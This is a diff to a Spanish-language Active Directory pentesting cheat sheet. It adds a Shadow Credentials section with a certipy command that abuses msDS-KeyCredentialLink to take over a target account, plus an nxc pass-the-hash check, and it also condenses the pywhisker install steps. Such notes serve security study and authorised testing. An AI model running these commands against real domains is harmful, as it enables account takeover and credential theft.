@@ -47,19 +47,28 @@ Paso 3:
 
 ## GenericWrite sobre Usuario - Forma 2 (Shadow Credentials Attack)
 
+**Shadow Credentials Attack** es un ataque que abusa de la propiedad **msDS-KeyCredentialLink** en AD para tomar control de cuentas.
+
+* [Theory - Shadow Credential Attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials)
+
+```bash 
+❯ certipy shadow auto -u 'ControlledAccount' -p 'P@$$w0rd123!' -account 'targetAccount' -dc-ip IP_DC
+```
+
+```bash 
+# Verificar si el HASH es válido 
+❯ nxc smb IP_DC -u targetAccount -H '259745cb123a52aa2e693aaacca2db52' --shares
+```
+
+## GenericWrite sobre Usuario - Forma 3 (Shadow Credentials Attack)
+
 * [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
 * [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 * [PKINITtools](https://github.com/dirkjanm/PKINITtools )
 
 ```bash 
 # Instalación 
-❯ git clone https://github.com/ShutdownRepo/pywhisker.git
-❯ cd pywhisker
-❯ python3 -m venv env
-❯ source env/bin/activate
-❯ pip install --upgrade pip
-❯ pip install -r requirements.txt
-❯ cd pywhisker
+❯ git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && python3 -m venv env && source env/bin/activate && pip install --upgrade pip && pip install -r requirements.txt
 ```
 
 ```bash
@@ -122,7 +131,7 @@ Paso 3:
 	# Output: NT Hash (aad3b435b51404eeaad3b435b51404ee:88f6fb6111fcf...)
 ```
 
-## GenericWrite sobre un usuario - Forma 3 (Shadow Credentials Attack) 
+## GenericWrite sobre un usuario - Forma 4 (Shadow Credentials Attack) 
 
 * [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
 * [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
